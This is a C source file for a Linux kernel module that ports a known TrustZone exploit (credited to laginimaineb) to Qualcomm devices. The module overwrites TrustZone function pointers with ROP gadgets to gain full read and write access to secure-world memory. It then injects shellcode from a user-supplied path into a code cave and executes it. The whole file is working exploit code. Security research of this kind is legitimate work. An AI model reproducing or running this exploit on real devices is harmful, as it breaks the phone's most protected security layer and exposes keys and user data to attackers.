#include <linux/kernel.h>
#include <linux/module.h>
#include "debug.h"
#include "symbols.h"
#include "file_io.h"
#include "exploit.h"
 
static char* shellcode_path = NULL;
static int shellcode_is_thumb = 0;

/**
* @brief tz_exploit_init - Module entry
*/
static int __init tz_exploit_init(void)
{
    uint8_t* shellcode;
    size_t shellcode_size = 0;
    int i;

    logd("[+] Disabling bounds checks\n");
    disable_bounds_checks();

    logd("[+] Overwriting the tzbsp_get_diag pointer address with a write gadget\n");
    write_dword_slow(TZBSP_GET_DIAG_POINTER_ADDRESS, STR_R0_R1_BX_LR);

    logd("[+] Restoring bounds check DWORD\n");
    write_dword_fast(BOUNDS_CHECK_DWORD_ADDRESS, 0x2);

    logd("[+] Enabling all domain permissions\n");    
    write_dword_fast(TZBSP_SECURITY_ALLOWS_MEMDUMP_POINTER_ADDRESS, SET_DACR);
    
    scm_call_atomic2(TZ_SVC_DUMP, TZ_SVC_DUMP_SECURITY_ALLOWS_MEM_DUMP, 0xFFFFFFFF, 0);

    logd("[+] Overwriting the tzbsp_security_allows_memdump pointer with a read gadget\n");
    write_dword_fast(TZBSP_SECURITY_ALLOWS_MEMDUMP_POINTER_ADDRESS, LDR_R1_R1_STR_R1_R0_BX_LR);

    logd("[+] Gained full R/W to all memory (including TrustZone kernel code!)\n");

    // load and execute shell code
    if (shellcode_path && strlen(shellcode_path) > 0) {
        shellcode_size = read_file_size(shellcode_path);

        while ((shellcode_size % sizeof(uint32_t)) != 0) {
            shellcode_size++;
        }

        if (CODE_CAVE_SIZE < shellcode_size) {
            logd("[-] Shellcode: %s - Shellcode:  %zu bytes. Available code cave size: %zu - Shellcode is too large for cave.\n", shellcode_path, shellcode_size, CODE_CAVE_SIZE);
            return 0;
        }

        shellcode  = (uint8_t*) kcalloc(shellcode_size, sizeof(uint8_t), GFP_KERNEL);

        if (read_file(shellcode_path, shellcode, shellcode_size, 0)) {
            logd("[-] Error reading shellcode file contents\n");
            kfree(shellcode);
            return 1;
        }

        logd("[+] Writing shellcode to code cave\n");
        write_range((uint32_t*)shellcode, shellcode_size, CODE_CAVE_ADDRESS);      
  
        kfree(shellcode);

        logd("[+] Overwriting tzbsp_security_allows_memdump pointer with shellcode address\n");
        write_dword_fast(TZBSP_SECURITY_ALLOWS_MEMDUMP_POINTER_ADDRESS, (CODE_CAVE_ADDRESS + (shellcode_is_thumb ? 1 : 0)));
        
        logd("[+] Executing shellcode\n");
 
        scm_call_atomic2(TZ_SVC_DUMP, TZ_SVC_DUMP_SECURITY_ALLOWS_MEM_DUMP, 0, 0);
        
    }
    
    return 0;
}

/**
* @brief tz_exploit_exit - Module exit
*/
static void __exit tz_exploit_exit(void)
{
 
}

module_init(tz_exploit_init);
module_exit(tz_exploit_exit);

module_param(shellcode_path, charp, 0000);
MODULE_PARM_DESC(shellcode_path, "Path to shellcode to inject");

module_param(shellcode_is_thumb, int, 0644);
MODULE_PARM_DESC(shellcode_is_thumb, "Whether shellcode starts out as thumb or not");

MODULE_DESCRIPTION("tzbsp_is_es_activated zero write primitive exploit by laginimaineb re-written as a kernel module");
MODULE_AUTHOR("Gassan Idriss <ghassani@gmail.com>");
MODULE_LICENSE("GPL");